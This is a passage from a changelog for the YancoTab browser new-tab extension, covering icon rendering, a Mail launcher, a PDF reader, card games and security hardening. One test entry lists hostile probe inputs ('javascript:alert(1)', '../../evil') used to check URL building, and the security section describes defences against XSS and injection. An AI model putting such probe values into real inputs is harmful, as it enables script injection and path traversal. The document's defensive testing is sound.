- `ensureHexDefs` emits both the gradient and the clipPath, with
  objectBoundingBox units and the `scale(0.01)` rescale.

Verified in-browser that the clip actually *resolves*, which computed style
cannot tell you — `clip-path` reports `url("#yv-hex-clip")` whether or not
the reference is live. Used hit-testing instead: on `.calc-key` the centre
hits the element while all three probed square corners miss, which is only
true if the clip is active. Confirmed `url("#yv-hex-clip")` and sane
near-square aspect ratios (0.87–0.89) on decorations across Todo, Settings
and Files.

### Service worker

Cache bumped to `yancotab-v1.2.1-hex-round` so existing installs evict the
13 stylesheets whose hex corners changed.

---

## [1.2.0] — 2026-07-29

The "Mail + edges" wave — a Mail launcher with real multi-account
addressing, and a root-cause fix for hex icon edge quality.

### Added — Mail hub

- **`os/apps/MailApp.js`** — a Mail app in the grid and app list. It is a
  launcher, not a client. Live unread counts are impossible without
  breaking the project's core contract: Gmail and Outlook both require
  OAuth2 (plus a server to hold the client secret) and the `identity`
  permission, and iCloud Mail exposes no public API at any permission
  level. YancoTab declares only `storage` and holds no accounts, so what
  the app buys is speed of access rather than inbox sync.
- **12 providers** (`os/apps/mail/providers.js`) — Gmail, Outlook
  (personal), Outlook 365 (work/school), iCloud Mail, Proton Mail, Yahoo,
  Zoho, Fastmail, Yandex, GMX, AOL, Tuta. Every host was verified to
  resolve before shipping.
- **Multi-account addressing** — the actual differentiator. Gmail
  multiplexes signed-in accounts by path segment (`/mail/u/0/`,
  `/mail/u/1/`), so pinning "work" and "personal" as separate accounts
  removes the account-switcher round trip on every visit. Outlook does the
  same with `/mail/0/`. Providers without that scheme set
  `accountIndex: false` and the UI hides the control entirely rather than
  asking a question with no answer.
- **Compose deep links**, suppressed where a provider has none. iCloud
  gets an "Open inbox" button only — a Compose button that just reopened
  the inbox would be a lie.
- **Zero-setup path** — provider tiles open immediately with no account
  configured. The account picker arms from "+ Add account" (the grid
  itself becomes the picker) and cancels on Esc.
- **Keyboard** — Enter opens the default inbox, C composes.
- Accounts persist through `kernel.storage` under a new registry key
  `yancotab_mail_v1` (`user-data`, conditional sync). Stores a provider id,
  a small account index, and a nickname — no addresses, no credentials, no
  tokens, because there is nothing to authenticate with.

### Changed — rounded-hex edge system

The hex tile stacked four independently `clip-path`-ed layers, which
capped how good it could look:

1. Six needle-sharp vertices.
2. **No outer glow was possible.** `clip-path` removes everything outside
   the shape, so every shadow on a clipped element had to be `inset` — the
   "outer bloom" was a hard-edged hexagon 5px larger with `blur(1px)`, a
   ring rather than a halo.
3. **Rim width drifted around the perimeter** (~3.0px on the vertical
   edges vs ~2.68px mid-diagonal), because offsetting a percentage-based
   polygon is not an equidistant offset.

- **`os/ui/icons/hexGeometry.js`** — one rounded-hexagon path, used two
  ways: a CSS `mask-image` for the tile body (a mask, unlike a clip, still
  permits an ancestor `drop-shadow`), and an SVG `<path>` stroke for the
  rim. A stroke is uniform by construction, and `vector-effect:
  non-scaling-stroke` holds it at a constant screen width at any tile
  size, which removes defect 3 outright. Same silhouette as the polygon it
  replaces, so nothing shifts on screen.
- **One shared `#yv-hex-rim` gradient** for every rim on the page. Its
  stops read `--accent` / `--hex-rim-mid` / `--hex-rim-deep`, and because
  gradient stops resolve custom properties against their own position in
  the tree, anchoring the `<defs>` in `<body>` makes a theme switch
  repaint every rim for free. One node instead of one per tile, and no
  per-instance ids to collide.
- **New tokens** — `--hex-mask`, `--hex-rim-w`, `--hex-rim-mid`,
  `--hex-rim-deep`, `--hex-bloom-*`. `--hex-clip` is retained for the
  in-app hex decorations (browser tabs, files vault, notes, pdf, photos,
  settings) that were not part of this pass.

### Fixed

- **Light-mode hex icons were being washed out.** `glass.css` repurposed
  `.hex-icon::before` from "outer bloom" to the animated specular sweep,
  but `body.theme-light .hex-icon::before` in `shell.css` had higher
  specificity (0,0,2,1 vs 0,0,1,1) and won — repainting the sweep as a
  flat teal wash at opacity 0.4 with `mix-blend-mode: screen` across the
  whole tile. Removed; the rule had no remaining job.
- **Dock tiles had no hover coverage.** The rim/bloom hover rules keyed off
  `.app-icon` / `.m-app-item`, neither of which wraps a dock tile, so
  hovering a dock tile's padding left the rim cold. `.app-dock-tile` added.
- **Pomodoro rendered as an emoji.** `APP_ICON_REGISTRY` already declared
  a `phosphor` SVG for it, but `SmartIcon._phosphorMap` didn't route it, so
  it fell through to the 🍅 static fallback.

### Changed — home screen

- **The content stack is centred instead of pinned to the top.** At
  1440×900 the Apps stack is ~490px inside a ~745px content box, so
  `justify-content: flex-start` left ~240px of dead space between the
  folder rail and the dock while crowding everything under the status bar.
  Uses `safe center`, not plain `center`: a centred flex column that *does*
  overflow pushes its first child past the scroll origin where no
  scrollbar can reach it — verified that plain `center` puts the greeting
  at −132px (unreachable) under forced overflow, while `safe center` keeps
  it at +20px.
- **`.page-tabs` and `.folder-pill` brought onto the shared edge recipe.**
  An audit of computed styles found the search bar, dock and widget cards
  already sharing one vocabulary (inset top highlight + inset bottom
  shadow + inset accent hairline ring + accent under-cast + depth), while
  `.page-tabs` was missing the accent ring and cast, and `.folder-pill`
  had only a 1px border over a 3% white fill — no shadow, no inset
  highlight, no ring, making it the flattest element on a page whose
  neighbours are all rendered glass. Both now compose from the same
  `--lg-*` tokens, so a token change moves every surface together.
  Light mode keeps the hairline and drops the accent cast, which reads as
  grime rather than light on `#f5f5f7`.

### Tests

1813 total (+52 from 1761).

- **`tests/hex-geometry.test.js`** — guards CSS/JS drift on the hex path.
  CSS cannot read a JS constant, so the path is necessarily duplicated
  between `HEX_PATH_D` and the `--hex-mask` token; the test parses the
  token back out of `tokens.css` and compares. Verified to fail on a
  one-digit mutation. Extents are measured on the *rendered* outline
  (solving B′(t)=0 per axis) rather than raw command coordinates, because
  a quadratic does not pass through its control point — asserting
  `min(y) === 0` would have passed while describing a shape that does not
  exist. The computed 2.235 inset matches Chrome's `getBBox()`.
- **`tests/mail-providers.test.js`** — `buildUrl()` is the only value handed
  to `window.open`, so it is the security boundary. Sweeps every provider ×
  hostile account indexes (`NaN`, negatives, floats, `'javascript:alert(1)'`,
  `'../../evil'`) × both kinds, asserting the result is always `https` with
  no leaked scheme, traversal, or unsubstituted placeholder. Unknown
  provider returns `null`, never a fallback guess.
- **`tests/mail-persistence.test.js`** — the blob is sync-replicated and
  reachable by JSON import, so it can arrive malformed. Covers unknown
  providers being dropped rather than remapped, id de-duplication across
  devices, dangling `defaultId` repair, the account cap, and label hygiene
  (C0/C1 controls, zero-widths and bidi overrides stripped; Arabic and
  emoji preserved).

### Service worker

Cache bumped to `yancotab-v1.2.0-mail-edges`. Precache gains the four Mail
modules, `css/mail.css`, and `hexGeometry.js`; all 349 entries verified to
exist on disk, since one missing path makes `cache.addAll()` reject and
silently disables offline support.

---

## [Unreleased]

The "PDF Reader v2" wave — the empty-state app from v1.1.1 grew into a
real reader with an IDB-backed library, four view modes, full-text
search, multi-color annotations, and Acrobat-style text selection.
Plus listing prep for the Chrome Web Store.

### Added — PDF Reader v2 (P1: Library + storage)

- **IndexedDB-backed `pdfStore` service** lifts the per-doc ceiling
  from ~5–10 MB (FilesApp's base64-in-localStorage budget) to
  gigabytes per file. Stores: `documents` (sourcePath-indexed),
  `viewState`, `annotations`, `searchIndex`, `quotes` (added in P4).
  Quota estimation, `navigator.storage.persist()` request, typed
  `PdfStoreQuotaError`.
- **PDF Library home screen** (`os/apps/pdf/library/`, 8 files):
  grid of doc cards with pdf.js-rendered thumbnails cached on the
  doc record, filter pills (All / Recent / Reading now), sort +
  search, grid↔list toggle, drag-drop import, Import-from-Files
  bridge to FilesApp, storage usage gauge, per-card context menu.
- **One-shot v1→v2 migration** — walks legacy `yancotab_pdf_recent`,
  decodes FilesApp data-URLs into Blobs, imports into IDB, rewrites
  recents to use docIds; backs v1 up to `_pre_v2`. Idempotent.
- Magic-byte vet on import (`%PDF-`), soft-warn at 500 MB, hard
  refuse at 2 GB.

### Added — PDF Reader v2 (P2: Reader chrome)

- **Zoom controls** — preset ladder (50/75/100/125/150/200/300/400 +
  Fit width / Fit page / Actual size), step-with-snap, clamp
  [0.25, 8.0], string parsing, pinch-anchor math. Ctrl+wheel zooms;
  double-click on empty page area toggles fit-width ↔ actual size.
- **Four view modes** — Single / Continuous (virtualized scroll
  list with IntersectionObserver upgrades) / Spread / Book (cover
  offset). Default mode picked from stage geometry on first load.
- **Page rotation** — 0/90/180/270 button; pdf.js's
  `getViewport({rotation})` handles geometry; render cache key
  includes rotation.
- **Reading-position memory** — page, zoom, view-mode, and rotation
  persist per-doc through `pdfStore.viewState`. Reopening any doc
  restores the exact reading state. "Resumed on page N" pill fades
  in for resumed pages > 1. Debounced 500ms write buffer.
- **Fullscreen** — F11 / titlebar button toggles
  `document.fullscreenElement` on the codex root. Side rail + info
  panel hide; stage fills the screen.
- **Keyboard** — F11 fullscreen, Ctrl+/-/0/1 zoom, arrows/PgUp-Dn
  page navigation, Home/End jump, T/H text-tool/hand-tool,
  Ctrl/Cmd+F find.
- **In-doc search** with "n of m" stepping, regex escape, case +
  whole-word toggles, persistent search index per doc cached to
  IDB. **Adobe-style highlights**: every match on every visible page
  gets a yellow tint, the current match gets bright orange + outline
  + glow; smooth-scrolls into view on step.
- **Print** (current page / page range / all), **Download** /
  **Export to Files**, **Dark pages** (CSS filter for dark-mode
  reading), **Link layer** (clickable cross-refs + URI links from
  PDF annotations), **More menu** (⋯).

### Added — PDF Reader v2 (P3: Annotations)

- **PDF-aware right-click menu** with five hit classifications:
  selection / annotation / link / page / shell. Selection menu has
  5-color highlight palette + Add note here + Send to Notes (primary)
  + Calc-on-numeric + Bookmark + Search inside doc + Search web. Page
  menu has Add note / Bookmark / Go to / Rotate / Fit / Copy page
  text. Annotation menu has Change color (5 swatches) + Delete. Link
  menu has Open / Copy. Position-clamped, dismiss on outside-click +
  Esc + scroll.
- **Multi-color highlights** — 5 swatches (teal/amber/rose/violet/
  blue), click-to-edit, delete via context menu.
- **Sticky notes** — `kind: 'note'` rows in `pdfStore.annotations`
  with body + 0..1 fractional coords (resilient across pdf.js
  versions). Pip rendered after every render; popover editor with
  Save / Delete / Close.
- **`mobileShell` opt-out** — `data-allow-context="true"` attribute
  on the PDF stage stops the shell's bubble-phase contextmenu
  preventDefault, and the capture-phase `selectstart` handler
  honors the same opt-out so text selection works inside the reader.

### Added — PDF Reader v2 (P4: Differentiators)

- **Quote Vault** — `pdfStore` v2 adds a `quotes` IDB store; context
  menu's "Save to vault" persists selected text + page citation.
  Side rail SAVED QUOTES section shows last 5 entries; click p.N to
  jump; × removes.
- **Bookmark Constellation** — when ≥3 bookmarks exist, an SVG
  star-chart timeline appears above the bookmark list. Stars
  positioned proportionally (page / totalPages), alternate above/
  below baseline; click to jump.
- **Auto-OCR for scanned PDFs** — pages with <5 chars after pdf.js
  text extraction are rendered to OffscreenCanvas at 1.5× scale and
  passed through tesseract-wasm. OCR results merge into the search
  index so scanned PDFs become searchable.

### Added — Final polish

- **Export Annotations as Markdown** — ⋯ menu collects all bookmarks,
  highlights, sticky notes, and saved quotes for the open doc,
  formats them sorted by page, and downloads as
  `<title>-annotations.md`.
- **Acrobat-style text selection + hand tool** — text-tool (Ꮖ) drags
  to select text across span boundaries (uses pdf.js's official
  `endOfContent` div trick to bridge gaps between spans during a
  drag). Hand-tool (✋) drags to pan/scroll the page; pointer-capture
  + grab/grabbing cursors. Toggle via toolbar button or T/H keys.

### Fixed

- **Selection bug from manual span loop** — replaced 24-line manual
  `<span>` builder in `pageView.js` with `pdfjsLib.TextLayer`. The
  manual version skipped the per-glyph `scaleX` transform that
  pdf.js computes from font metrics, so span hit-areas didn't match
  rendered glyph widths and drag-selection skipped words / jumped
  erratically.

### Tests

+128 tests since v1.1.1 (1337 → 1465+ depending on which P-phase
counter you trust): `pdf-zoom`, `pdf-viewport`, `pdf-reading`,
`pdf-search`, `pdf-notes-engine`, `pdf-libraryReducer`,
`pdf-migration`, `pdf-import-vet`, `ocr-service`.

### Service worker

Cache name evolved through the buildout:
`yancotab-v1.2.0-pdf-library` → `v1.2.1-pdf-zoom-modes` →
`v1.2.2-pdf-resume-fullscreen` → `v1.2.3-pdf-search` →
`v1.3.0-pdf-annotations` → `v1.4.0-pdf-tools`.

---

## [1.1.1] — 2026-05-08

Pre-CWS audit pass. Fixed real user-visible bugs in shipped v1.1.0,
plus architectural debt and AI-cruft cleanup.

### Fixed (user-visible bugs in v1.1.0)

- **TodoWidget + SmartSearch wrote v1 schema while TodoApp used v2.**
  Toggling a checkbox in the home-screen Todo widget mutated a
  schema TodoApp no longer reads — UI showed done, app showed open.
  Two tasks with the same text collided. New `quickAddTask` /
  `quickToggleTask` helpers in `os/apps/todo/persistence.js` route
  through the v2 reducer (mission ids, streak log, completedAt).
- **Settings 24-Hour Time toggle now propagates everywhere.**
  Previously wrote to a phantom `yancotab_clock_state_v3` (registered
  but unused) and read from `yancotab_clock_v2` (not registered);
  ClockApp / StatusBar / ClockWidget all stayed on 12-hour. Six
  callers collapsed onto canonical `yancotab_clock_v3`.
- **Game saves no longer fail silently on storage full.** Six game
  persistence paths (Solitaire, Spider, Mahjong, Tarneeb, Trix,
  Minesweeper) used `try { save() } catch {}`. New
  `os/utils/safeSave.js` helper warns + emits a single deduped
  toast per session.
- **`'auto'` theme + AppStorage string-save bug.** Latent: AppStorage
  `normalize()` was running `JSON.parse()` on every string input,
  silently dropping every string-typed preference write (search
  engine, theme, sort modes, view modes). Fixed; raw scalar
  strings now persist correctly. `'auto'` added to theme validator
  and resolved at boot via `matchMedia` to prevent FOUC.

### Security (defense in depth)

- **Scheme allowlist for user-controllable URLs.** New
  `os/utils/url.js` `isSafeUrl()` allows only `https`, `http`,
  `mailto`, `tel`, `sms`. Closed the `javascript:` XSS path in
  `MobileShortcutModal` save + `AppGrid.openUserApp`. `FilesApp.
  _sendToBrowser` now refuses `data:` URLs entirely.
- **File-import size caps.** Wallpaper 5 MB, Photos 10 MB, Files 10 MB.
  Quota-exceeded errors surface as toast.
- **PDF magic-byte verification + 50 MB cap.** Blocks renamed binary
  blobs from reaching pdf.js. `isEvalSupported: false` set on
  `getDocument()` for defense-in-depth against CVE-2024-4367 (we
  ship pdf.js 4.10.38 which has the patch already; this is the
  third layer).
- **Ko-fi modal `sandbox` + `referrerpolicy="no-referrer"`.** Hides
  the chrome-extension://<id> URL and prevents framebust. Modal
  also gained `role="dialog"`, `aria-modal`, `aria-labelledby`,
  Escape-to-close, and focus-on-open.
- **`importAll` strips `__proto__`/`constructor`/`prototype` keys.**
- **CSV-injection escape in calculator tape export.**
- **NaN guards** on parseFloat/parseInt slider readers (ClockApp
  alarm volume, PhotoEditor adjustments + brush size).

### Architecture / cleanup

- **Wallpaper writes route through `kernel.storage`** so the choice
  syncs across devices via chrome.storage.sync. Custom-image data
  URL stays in raw localStorage (would blow the 8 KB/item cap).
  Envelope-aware readers added to themes.js, starfield, and
  MobileContextMenu for early-boot paths.
- **`function css(href)` extracted from 14 app files** into
  `os/utils/dom.js` `cssLink(href)`. −56 LOC.
- **ProcessManager public API**: `getInstance(pid)`,
  `getProcessInfo(pid)`, `closeProcess(pid)`. Three sites in
  mobileShell that were poking past `processManager.processes` now
  go through the API.
- **Event names normalized to kebab-case.** 5 snake_case events
  renamed (`theme_change`, `name_changed`, `clock_update`,
  `theme_request`, `weatherchange`). `KNOWN_EVENTS` const added to
  `os/kernel.js` documenting both buses.
- **REGISTRY duplicate `yancotab_starfield_enabled` removed** +
  source-grep regression test that fails on any future duplicate.
- **`offline_enabled: true`** added to manifest.
- **Dead `css/solitaire.css` deleted** (812 lines, was only in SW
  precache; the live cosmic Solitaire uses a different file).

### Tests

1337 tests, +16 from v1.1.0. New suites:
- `tests/url-safe.test.js`
- `tests/safeSave.test.js`
- `tests/todo-persistence-helpers.test.js`
- `tests/appStorage-string-save.test.js`
- `tests/appStorage-registry-integrity.test.js`

---

## [1.1.0] — 2026-05-07

The "Table salon" wave — Tarneeb and Trix share a new oval-felt
salon shell with AI banter, Quick-start presets, hand history, and
cross-game tab switching. TicTacToe rebuilt from canvas to DOM in
the cosmic design language.

### Added — Table salon (shared shell for Tarneeb + Trix)

- **`os/apps/games/table/TableShell.js`** — layout component the two
  card games mount. Owns the chrome (titlebar with elegant Playfair
  Display italic title + cross-game tab pills Tarneeb/Trix/Hand history),
  left rail with Quick-start preset cards, center felt slot, right rail
  with scoresheet + side-actions slot + banter feed + emote row. Mobile
  collapses to single column at ≤ 720px.
- **`os/apps/games/table/banter.js`** — AI flavor-line dispatcher.
  Subscribes to reducer events (`bid:total`, `trick:won`, `slam`,
  `contract:picked`, `kingdom:end`, `game:end`, etc.), picks lines per
  seat × trigger with non-repeat ring buffer + 1.5s cooldown +
  per-trigger probability gates. One-way only — replaces the mock's
  multiplayer chat (no input field, no networking).
- **`os/apps/games/table/presets.js`** — generic preset registry; per-game
  packs (Tarneeb: Hamra Salon casual / Damascus Diwan expert / Solo;
  Trix: Bourj Trix / Saida Partners / Solo) provide the configs.
- **`os/apps/games/table/handHistory.js`** — per-game persistence
  (`yancotab_tarneeb_history_v1`, `yancotab_trix_history_v1`); newest-
  first append with 50-entry trim. Hand-history tab in titlebar shows
  last N rounds for the host game.
- **`os/apps/games/table/avatars.js`** — hex-clip compass avatars for
  N/E/S/W with role-based gradient (you / partner / opponent) and turn
  glow.
- **`os/apps/games/table/cardFace.js`** — bone-parchment Georgia-serif
  card face for the trick area + hand fan; `#c5152e` red, `#0c0c0c`
  black per the design package.

### Added — Tarneeb on the salon

- **`tarneebFeltView.js`** — oval green felt arena. Trump banner top-
  right, 4 compass avatars (south = you, north = partner per actual
  partnership), trick area in middle with cards rotated per seat,
  glass bid-bar overlay (12 number buttons + PASS) during the BIDDING
  phase, 7-position fan rotation map for the 13-card hand, status line
  bottom-center.
- **`tarneebSalonView.js`** — right-rail scoresheet (HAND/BID/US/THEM
  with last 7 rounds + totals row + "First to 41" footer) and
  per-round history-entry builder.
- **`tarneebBanter.js`** — Levantine flavor pack across 9 triggers.
- **`tarneebPresets.js`** — 3 quick-start configs.
- **`tarneebReducer.js`** — emits `bid:total` event after bidding
  completes (winner + top + total) for banter context.
- **`TarneebApp.js`** — mounts TableShell, accepts `config.preset`
  ride-along on spawn, modals (rules / scores) overlay on app root.

### Added — Trix on the salon

- **`trixFeltView.js`** — same compass + trick + hand pattern, but
  trump banner becomes a contract banner (♚/♛/♦/✚/✦), bid bar becomes
  a contract picker (5 pill buttons for remaining contracts) when
  south is the kingdom owner, "X is picking…" wait pill otherwise,
  trick area swaps to a 4-row layout board during the trix layout
  contract, hand fan grows to 13-position rotation, layout PASS
  button when no legal play is available.
- **`trixSalonView.js`** — right-rail scoresheet (last 6 deals as
  K# + contract glyph + your delta + total + per-seat tally; flips
  to team scores in partners mode) and per-deal history-entry builder.
- **`trixBanter.js`** — Levantine flavor pack across 9 triggers.
- **`trixPresets.js`** — 3 quick-start configs.
- **`trixReducer.js`** — `contract:picked`, `kingdom:end`, `game:end`
  events; `advanceAfterDeal` now takes events to push from inside.
- **`TrixApp.js`** — mounts TableShell with the same pattern as Tarneeb.

### Added — TicTacToe DOM rebuild (Cosmic redesign)

- **`os/apps/tictactoe/engine.js`** — pure FSM. Reducer over PLACE /
  RESET / RESET_STATS / SET_MODE / SET_DIFFICULTY / HYDRATE; whitelist
  on hydration so junk in storage can't poison state.
- **`os/apps/tictactoe/ai.js`** — minimax with smart-chance gating
  (easy 15% / medium 60% / hard 100% optimal); injectable RNG for
  test determinism.
- **`os/apps/tictactoe/view.js`** — DOM builder for the entire app
  frame: titlebar with vs AI / Single / Stats tabs, oval board with
  3×3 squircle grid, hex-clip corner bezels matching the dock-tile
  motif, status pulse, score chips, action row with difficulty
  chooser. Stats panel with 6 stat blocks + Reset.
- **`os/apps/tictactoe/winLine.js`** — animated SVG comet streak
  for the winning line (glow + main paths, CSS keyframe
  stroke-dashoffset reveal).
- **`TicTacToeApp.js`** — replaced wholesale (1201 → 211 lines).
  Reads new `yancotab_tictactoe_v1` storage key; one-shot migrates
  from legacy `yancotab_neon_tactics`. Keyboard: arrows/WASD cursor,
  Enter/Space place, R reset, 1/2/3 difficulty, Esc close.
- **`css/tictactoe.css`** — replaced wholesale; all colors from
  `css/tokens.css`. Mobile (≤ 720px) collapses stats grid to 2-col.
  Reduced-motion drops every animation to instant.

### Changed

- **Salon titlebar simplified** — dropped the macOS-style traffic-light
  dots and the "the table / X" breadcrumb (decorative-only). Title is
  just the game name in Playfair Display italic 24px with a faint
  accent glow.
- **Salon sizing override** — `:has()` selector opens Tarneeb / Trix
  windows at 90%×92% of viewport (vs the default 75%×84%) so the 200/
  1fr/240 stage fits the oval felt comfortably. WindowChrome edge-
  handle resize still works — manual inline styles override the
  default.
- **Salon app-root override** — `.trix-remake { height: 100vh }` was
  bursting out of the chrome content area. New `:has(.table-app-frame)`
  rule forces the root to fill its windowed parent.
- **Felt positions percentage-based** — north top / east-west / south /
  hand / bid-bar / status all expressed as % of the 660px design
  baseline so the oval scales gracefully on resize.
- **Process manager** — `kernel.on('app:open', ...)` now forwards the
  optional `config` arg (`spawn(appId, config)`) so future home-screen
  / search launches can pass `{preset: 'damascus'}` directly. Existing
  single-arg callers unaffected.

### Storage

- New REGISTRY entries: `yancotab_tarneeb_history_v1`,
  `yancotab_trix_history_v1` (user-data, conditional sync, 50-cap),
  `yancotab_table_banter_seed` (volatile, never sync),
  `yancotab_tictactoe_v1` (user-data, conditional sync, replaces the
  legacy `yancotab_neon_tactics` shape via one-shot migration).

### Tests

- 502 total (was 471, +31 new). Covers TableShell presets/banter/
  hand-history (Wave 1) plus the TicTacToe engine + AI (Wave 3).

### Service worker

- Cache name `yancotab-v1.1.0-table-ttt` to evict pre-rebuild assets.
- Precache list gains the 7 table modules + 4 trix salon files +
  4 tictactoe modules + `css/table.css`.

---

## [1.0.0] — 2026-05-06

First public release on Chrome Web Store.

### Added — Liquid Glass design pass (post-launch polish)

Implements the design from claude.ai/design (handoff bundle archived in
`design-lab/fetched-design/`). Source materials: README + chat log where
each surface was approved + the hi-fi `YancoTab New Tab.html` mock.

- **Tokens** (`css/tokens.css`) — new `--lg-*` recipe layer (tints, sheen,
  edge, spotlight, cast, sweep) + canonical `--motion-snappy` /
  `--motion-cinematic` / `--motion-spring` curves. Light-mode mirror for
  every token.
- **`css/glass.css`** — new polish stylesheet that loads last so it wins
  specificity. Owns the polish across hex tiles, search bar, widget cards,
  status bar, dock, cosmic stage (horizon glow + perspective grid floor),
  ⌘K hint, section headings, signature pill, scope tabs, folder rail.
- **Hex app icons** — chromed accent ring, wet-glass body, top sheen +
  spotlight, animated specular sweep on hover, accent under-cast halo.
- **Search bar** — bumped to 620×56 (design target). Accent-tinted
  border, layered top-light glass, drop shadow, accent under-glow on
  focus, `⌘K` hint badge that fades on focus + hides on touch devices.
- **Search scope tabs** (`SmartSearch.js`) — All / Apps / Files / Notes /
  Web below the input. Functional filter: each scope narrows result types
  and the Web fallback. Empty-state row when a scoped query has no
  matches.
- **Game icons** (`GameIcons.js`) — all 9 game SVGs replaced with the
  design's photoreal versions: Solitaire (green felt + 3 red card-backs +
  Ace top), Spider (3 stacks + cobweb hint + spider), Mahjong (ivory tile
  + bold red 中), Snake (pixel sprite + apple), Memory (3 cards w/ flipped
  star), Minesweeper (cell grid + numbers + flag + mine), Tic-Tac-Toe
  (engraved grid + teal X + red O), Tarneeb (fan + K♠ trump), Trix
  (fan + A♦). Gradient IDs prefixed `gi-` for uniqueness on the page.
- **Status bar** (`StatusBar.js`) — restructured into a full-width 3-column
  tray. Brand mark (hex glyph + YancoTab + /new tab) on the left, mid
  pills (local weather city·temp + net online/offline) in the middle,
  right cluster keeps activity pill + clock + theme + settings buttons.
- **Greeting hero** (`Greeting.js`) — design's structure: small mono
  uppercase greet line ("WEDNESDAY · GOOD EVENING, YAMAN") in accent
  color, giant `clamp(56px, 12vw, 96px)` live clock with teal `·SS`
  seconds, mono uppercase day-of-year date.
- **Pomodoro widget** (`widgets/PomodoroWidget.js`) — focus timer.
  State machine `idle → focus (25min) → break (5min)` × 4 sessions.
  Click to start / pause / resume; right-click to reset. State persists
  via `kernel.storage`. Phase transitions fire kernel toasts and emit
  `yancotab:activity` events. Visual: 88px SVG ring with accent stroke +
  drop-shadow + 2s pulse during focus, MM:SS centered, mono session
  label below.
- **Activity feed widget** (`widgets/ActivityWidget.js`) — recent
  activity, newest-first. Listens to `process:started` and the custom
  `yancotab:activity` event. 20-event ring buffer; displays the last 4.
  De-dupes identical labels within 2s. `*foo*` markdown renders as
  `<em>`. Empty-state hint on first install.
- **Folder rail** (`FolderRail.js`) — pill row below the grid mirroring
  the folders that already live in AppGrid. Each pill: 18×18 mini 2×2
  hex preview + folder name + child count. Click dispatches the same
  `item:open` event the in-grid hex uses.
- **Hex-tile dock** (`AppDock.js`) — replaces the old labeled NavBar
  with the design's exact 9-tile + 2-separator row:
  Browser | Notes | Todo | Weather | Clock | sep | Solitaire | Snake |
  Files | sep | Settings. Each tile uses SmartIcon at `--hex-size:
  44px`. Click → `kernel.emit('app:open', appId)`. Subscribes to
  `process:started` / `process:stopped` and lights a 4px pulsing accent
  dot under the tile while the matching pid is alive.
- **Cosmic stage** — `body::before` accent horizon glow (320px), `body::
  after` perspective grid floor (80×60px accent grid, `rotateX(60deg)`,
  masked to fade up). Light-mode mirrors.
- **Section headings** — uppercase title + 1px gradient rule + mono
  meta tag, between widgets and grid. Numbers omitted per Yaman's call.
- **Signature pill** — fixed bottom-right `${VERSION} · all systems
  nominal` pill with pulsing accent dot. Hides in-app.
- **AppGrid stale-positions reflow** (`MobileGridState.js`) —
  `_hasStalePositions()` repacks items into the current cols on first
  boot at a wider viewport. Fixes the symptom where items saved at
  narrower cols would render in only the leftmost columns of a 9-col
  desktop grid.
- **Storage** — three new REGISTRY entries: `yancotab_pomodoro_v1` and
  `yancotab_activity_v1` (user-data, sync conditional), and an updated
  `yancotab_widgets` default that ships `pomodoro: true`, `activity:
  true`, `clock: false`.
- **Service worker cache** bumped to `yancotab-v1.0.0-glass` so existing
  installs at the prior `yancotab-v1.0.0` cache pick up the new files
  on reload.

### Added — Phase 3 (LAUNCH) closeout
- **Promotional tile generator** (`promo-tile-generator.html`) — open in browser, click Download, get a 440×280 PNG ready for the Chrome Web Store listing's small tile slot. Uses the YancoTab logo on the left over a deep-space gradient with subtle starfield, accent glow, and "Your desktop, in every new tab." tagline. Required for CWS submission.
- **Phase 3 verification:** i18n complete (`_locales/en/messages.json` + manifest `__MSG_*__` references), privacy.html shipped (covers data/permissions/external services/storage/contact), 5 store screenshots at 1280×800, manifest CSP and permissions clean (`storage` only), all 4 icon sizes present, version synced across manifest/package/version.js/sw.js, extension payload ~9MB (under 10MB limit).
- **Remaining manual steps** before CWS submission: (1) generate the promo tile from the HTML page; (2) host `privacy.html` at a public URL and link in the CWS listing; (3) zip the extension and upload.

### Added — Phase 2 (DELIGHT) closeout
- **`Ctrl+N`** — creates a new note when the Notes app is the active window. Calls `NotesApp._createDocument()` which writes a blank note to the filesystem and opens it in a new editor window.
- **`Ctrl+Enter`** in SmartSearch — quick-capture as a note. Prepends `!` to whatever the user typed (existing quick-capture syntax) and triggers Enter, so the typed text becomes a new note title.
- **SmartSearch result limit raised 5 → 7** to match the production plan spec.
- **Phase 2 audit summary:** Greeting, Toast, Onboarding, Quick Links all verified DONE. Widget bar ships 3/4 widgets — Pomodoro widget deferred (no Pomodoro app exists yet; building the app is out of v1 scope). Command palette `> focus` mode also deferred — depends on Focus Mode (Phase 4 feature).

### Added — Error boundary safety net (Phase 1.9 closeout)
- **MobileShell `process:started` handler** — already wrapped app-mount in try/catch with a "App crashed" + Restart card (verified working). Extended to ALSO wrap `WindowChrome` instantiation so a fundamental DOM-construction failure in window chrome can't take down the entire shell. On WindowChrome failure: console.error + error toast, app.close() called, home grid stays usable.

### Fixed — Wallpaper precache + dead-path cleanup (Phase 1.7 closeout)
- **Service worker precache** was referencing 7 wallpapers + 1 root `wallpaper.webp` that no longer exist (`black`, `dark`, `deep-blue`, `mint`, `pink`, `sky`, `violet` — replaced months ago by 8 themed wallpapers `emerald`, `obsidian`, `sapphire`, `amethyst`, `rose`, `arctic`, `sunset`, `crimson`). The dead refs caused `cache.addAll()` to reject on first SW install, silently disabling offline support. Replaced with the 8 real wallpapers.
- **MobileContextMenu wallpaper picker** referenced the same dead 7-list. Updated to the 8 themed wallpapers and added migration entries for old gradient strings + old image paths so users with stale `yancotab_wallpaper` values (`url("assets/wallpapers/deep-blue.webp")`, hex colors, etc.) auto-migrate to the closest current theme.
- **`scripts/take-screenshots.mjs`** updated to reference `sapphire.webp` instead of dead `deep-blue.webp`.

### Changed — Storage consistency (Phase 1.5 closeout, Tier 1)
- **NotesApp** — `view` and `sort` UI prefs migrated from raw `localStorage` to `kernel.storage` (with new REGISTRY entries `yancotab_notes_view` and `yancotab_notes_sort`).
- **StatusBar** — removed legacy `yancotab_clock_v2` fallback. Now reads only the canonical `yancotab_clock_state_v3` via `kernel.storage`.
- **AppearanceSettings** — Background Animation toggle now writes through `kernel.storage` instead of raw `localStorage` (registered new key `yancotab_starfield_enabled`).
- **starfield.js** — envelope-aware: parses AppStorage's `{data, version, ts, ...}` wrapper as well as plain JSON / legacy strings. Required because starfield boots before kernel.storage is ready.
- **WeatherService** confirmed compliant — already prefers `kernel.storage` when the service constructor receives it from kernel.js (always, in normal operation). Legacy localStorage reads at lines 122-152 are one-time migration paths reading deprecated keys, not violations.

### Added — Starfield motion toggle (Phase 1.2 closeout)
- **Settings → Appearance → Motion → Background Animation** — toggle for the starfield. Storage key `yancotab_starfield_enabled` was already wired up in `starfield.js` but no UI exposed it. Toggling reuses the `yancotab:theme_change` event so the starfield starts/stops live without needing a page reload (and without registering duplicate listeners).
